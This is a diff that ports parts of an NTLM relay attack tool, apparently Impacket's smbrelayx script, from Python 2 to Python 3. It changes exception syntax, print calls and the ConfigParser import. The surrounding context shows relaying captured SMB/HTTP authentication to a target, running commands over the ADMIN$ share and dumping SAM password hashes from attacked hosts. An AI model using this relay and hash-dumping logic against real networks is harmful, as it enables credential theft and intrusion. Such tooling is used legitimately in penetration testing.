@@ -34,7 +34,7 @@
 # programmatically.
 #
 
-import ConfigParser
+from configparser import ConfigParser
 import SimpleHTTPServer
 import SocketServer
 import argparse
@@ -118,7 +118,7 @@ class doAttack(Thread):
 
                 remoteOps  = RemoteOperations(self.__SMBConnection, False)
                 remoteOps.enableRegistry()
-            except Exception, e:
+            except Exception as e:
                 # Something wen't wrong, most probably we don't have access as admin. aborting
                 logging.error(str(e))
                 ATTACKED_HOSTS.remove(self.__SMBConnection.getRemoteHost())
@@ -133,12 +133,12 @@ class doAttack(Thread):
                     logging.debug('Raw answer %r' % self.__answerTMP)
 
                     try:
-                        print self.__answerTMP.decode(CODEC)
-                    except UnicodeDecodeError, e:
+                        print(self.__answerTMP.decode(CODEC))
+                    except UnicodeDecodeError as e:
                         logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                                       'https://docs.python.org/2.4/lib/standard-encodings.html\nand then execute wmiexec.py '
                                   'again with -codec and the corresponding codec')
-                        print self.__answerTMP
+                        print(self.__answerTMP)
 
                     self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
                 else:
@@ -148,7 +148,7 @@ class doAttack(Thread):
                     samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
                     samHashes.dump()
                     logging.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
-            except Exception, e:
+            except Exception as e:
                 ATTACKED_HOSTS.remove(self.__SMBConnection.getRemoteHost())
                 logging.error(str(e))
             finally:
@@ -306,7 +306,7 @@ class SMBClient(SMB):
         try:
             resp = dce.request(request)
             #resp.dump()
-        except DCERPCException, e:
+        except DCERPCException as e:
             #import traceback
             #print traceback.print_exc()
             logging.error(str(e))
@@ -518,7 +518,7 @@ class HTTPRelayServer(Thread):
                     self.client = SMBClient(self.target, extended_security = True)
                     self.client.setDomainAccount(self.machineAccount, self.machineHashes, self.domainIp)
                     self.client.set_timeout(60)
-                except Exception, e:
+                except Exception as e:
                    logging.error("Connection against target %s FAILED" % self.target)
                    logging.error(str(e))
 
@@ -630,7 +630,7 @@ class SMBRelayServer(Thread):
         self.one_shot = False
 
         # Here we write a mini config for the server
-        smbConfig = ConfigParser.ConfigParser()
+        smbConfig = ConfigParser()
         smbConfig.add_section('global')
         smbConfig.set('global','server_name','server_name')
         smbConfig.set('global','server_os','UNIX')
@@ -706,7 +706,7 @@ class SMBRelayServer(Thread):
             client = SMBClient(self.target, extended_security = extSec)
             client.setDomainAccount(self.machineAccount, self.machineHashes, self.domainIp)
             client.set_timeout(60)
-        except Exception, e:
+        except Exception as e:
             logging.error("Connection against target %s FAILED" % self.target)
             logging.error(str(e))
         else: 
@@ -1025,7 +1025,7 @@ if __name__ == '__main__':
     RELAY_SERVERS = ( SMBRelayServer, HTTPRelayServer )
     # Init the example's logger theme
     logger.init()
-    print version.BANNER
+    print(version.BANNER)
     parser = argparse.ArgumentParser(add_help=False,
                                      description="For every connection received, this module will try to SMB relay that "
                                                  " connection to the target system or the original client")
@@ -1059,7 +1059,7 @@ if __name__ == '__main__':
 
     try:
        options = parser.parse_args()
-    except Exception, e:
+    except Exception as e:
        logging.error(str(e))
        sys.exit(1)
 
@@ -1099,7 +1099,7 @@ if __name__ == '__main__':
 
         s.start()
         
-    print ""
+    print("")
     logging.info("Servers started, waiting for connections")
     while True:
         try:
